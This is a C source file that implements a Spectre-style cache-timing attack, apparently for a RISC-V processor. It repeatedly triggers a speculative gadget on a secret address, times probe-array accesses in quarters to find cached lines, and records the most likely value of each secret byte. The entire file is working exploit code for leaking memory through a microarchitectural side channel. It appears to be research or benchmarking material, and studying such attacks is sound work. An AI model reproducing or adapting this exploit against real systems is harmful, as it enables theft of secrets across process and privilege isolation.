#include <string.h>

#include "spectre.h"

#ifndef ROUNDS
#define ROUNDS 3
#endif
#define QUARTERS 4
#define QUARTER_SZ 64

/* first N secret bytes only; for quick tuning runs */
#ifndef ATTACK_BYTES
#define ATTACK_BYTES SECRET_SZ
#endif
#ifndef ATTACK_SAME_ROUNDS
#define ATTACK_SAME_ROUNDS 10
#endif

/*
 * One 16 KB probe array per round, with a different base each round.  A line
 * cached by an earlier round has a different tag, so it cannot be mistaken
 * for a hit in a later round.
 */
#define ARRAY2 ((volatile uint8_t *)ARRAY2_BASE)
static uint8_t hits[256] __attribute__((aligned(64)));

extern void specFunc(volatile uint8_t *base, uint64_t addr);

int main(void)
{
  uint64_t t0 = spectre_rdcycle();
  uint64_t secretAddr = (uint64_t)spectre_secret.secret;
  uint8_t dummy = 0;

  spectre_flush();

  for (uint64_t len = 0; len < ATTACK_BYTES; len++) {
    memset(hits, 0, sizeof hits);

    for (uint64_t round = 0; round < ROUNDS; round++) {
      volatile uint8_t *base =
          ARRAY2 + (len * ROUNDS + round) * 256 * L1_BLOCK;

      /*
       * Probe one quarter of the possible byte values at a time.  The
       * speculative gadget leaves exactly one line of the current base in L1,
       * and that line is the only access to its set inside the quarter, so
       * random replacement cannot evict it before the probe.
       */
      for (int q = 0; q < QUARTERS; q++) {
        for (uint64_t r = 0; r < ATTACK_SAME_ROUNDS; r++)
          specFunc(base, secretAddr + len);

        for (int i = q * QUARTER_SZ; i < (q + 1) * QUARTER_SZ; i++) {
          uint64_t start = spectre_rdcycle();
          dummy &= base[i * L1_BLOCK];
          __asm__ volatile("fence" ::: "memory");
          uint64_t diff = spectre_rdcycle() - start;
          if (diff < CACHE_HIT_THRESHOLD)
            hits[i]++;
        }
      }
    }

    uint8_t idx[2];
    uint64_t cnt[2];
    spectre_top_two(hits, idx, cnt);
    spectre_result.recovered[len] = idx[0];
    spectre_result.alt[len] = idx[1];
    spectre_result.count0[len] = (uint8_t)cnt[0];
    spectre_result.count1[len] = (uint8_t)cnt[1];
  }

  (void)dummy;
  spectre_result.cycles = spectre_rdcycle() - t0;
  spectre_result.attempted = ATTACK_BYTES;
  spectre_result.rounds = ROUNDS;
  spectre_finish();
}
